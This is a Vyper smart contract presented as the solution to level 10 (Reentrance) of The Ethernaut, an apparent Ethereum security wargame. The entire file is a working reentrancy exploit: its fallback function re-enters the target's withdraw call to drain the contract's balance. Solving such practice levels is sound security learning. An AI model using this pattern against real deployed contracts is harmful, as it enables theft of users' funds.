# pragma version 0.4.0
"""
@title A hack for level 10 (Reentrance) of The Ethernaut
@license MIT
@author unluckyduke7
"""

interface Reentrance:
	def balances(account: address) -> uint256: view
	def donate(to: address): payable
	def withdraw(amount: uint256): nonpayable


instance: transient(Reentrance)


@payable
@external
def __default__():
	amount: uint256 = min(self.instance.address.balance, staticcall self.instance.balances(self))
	if amount != 0:
		extcall self.instance.withdraw(amount)


@payable
@external
def hack(instance: Reentrance):
	assert msg.value != 0

	self.instance = instance

	extcall instance.donate(self, value=msg.value)
	extcall instance.withdraw(msg.value)
	raw_call(msg.sender, b"", value=msg.value)
